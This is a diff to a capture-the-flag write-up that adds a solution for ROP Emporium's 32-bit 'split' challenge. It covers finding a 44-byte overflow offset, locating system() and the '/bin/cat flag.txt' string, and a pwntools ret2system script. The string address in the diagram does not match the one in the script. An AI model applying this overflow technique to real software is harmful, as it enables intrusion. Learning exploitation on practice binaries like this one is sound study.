@@ -56,12 +56,61 @@ res = r.recvuntil{'}'} # receiving output until getting the } char which is the 
 print(res)
 ```
 
-running the exploit give us the flag succesfully
+running the exploit give us the flag successfully
 ![img](imgs/ee.png)
 ## Challenge 2: Split
+Checksec gives us the following:
+![img](imgs/ch2.png)
+running it:
+```bash
+split by ROP Emporium
+32bits
 
-in progress...
+Contriving a reason to ask user for data...
+> test input
 
+Exiting
+```
+info functions in gdb and we can see a function pwnme and usefulFunction
+![img](imgs/fu.png)
+We already know there will be a buffer overflow on pwnme function so let's just search for an offset
+![img](imgs/b.png)
+good now we know that it takes 44 bytes to overwrite the EIP. Now let's see the usefulFunction
+![img](imgs/u.png)
+There is call to system at 0x0804861a but without any arguments, let's note that address for later. <br />
+Now according to the challenge description:
+```
+I'll let you in on a secret: that useful string "/bin/cat flag.txt" is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen.
+```
+let's find that ```/bin/cat flag.txt``` string, i'll be using ropper in gdb for that
+![img](imgs/p1.png)
+Good now we have what we need to construct the exploit, it will be like this :<br />
 
+```
+|-------------------|
+|      padding   	|  #A * 44
+|-------------------|
+|    system addr    |  #0x0804861a
+|-------------------|
+| usefulString addr |  #0x08049030
+|-------------------|
+```
 
+which will get us something like this:
 
+```python
+from pwn import *
+
+r = process('./split32')
+
+payload = 'A' * 44
+payload += p32(0x0804861a) #system addr
+payload += p32(0x804a030) #usefulString addr
+print (payload)
+r.recvuntil('>')
+r.sendline(payload)
+print r.recvall()
+```
+
+running the exploit will successfully get us the flag
+![img](imgs/da.png)
